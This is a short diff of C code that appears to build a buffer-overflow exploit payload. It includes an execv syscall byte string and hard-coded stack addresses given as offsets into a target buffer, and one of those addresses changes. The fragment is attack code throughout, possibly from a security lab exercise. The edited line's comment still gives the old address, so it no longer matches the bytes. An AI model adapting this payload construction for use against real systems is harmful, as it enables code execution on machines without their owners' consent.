@@ -82,7 +82,7 @@ int main(void)
   // execv syscall
   char exec_arg[] = "\x3b\x01\x01\x01";
 
-  char null_arg_addr[] = "\x88\x69\xbf\xbf"; // bufr + 619, BFBF 6988
+  char null_arg_addr[] = "\x94\x69\xbf\xbf"; // bufr + 631, BFBF 6988
   char y_addr[] = "\x98\x69\xbf\xbf"; // bufr + 635
   char null_arg_addr2[] = "\x9c\x69\xbf\xbf"; // bufr + 639
   char x_addr[] = "\xa0\x69\xbf\xbf"; // bufr + 643
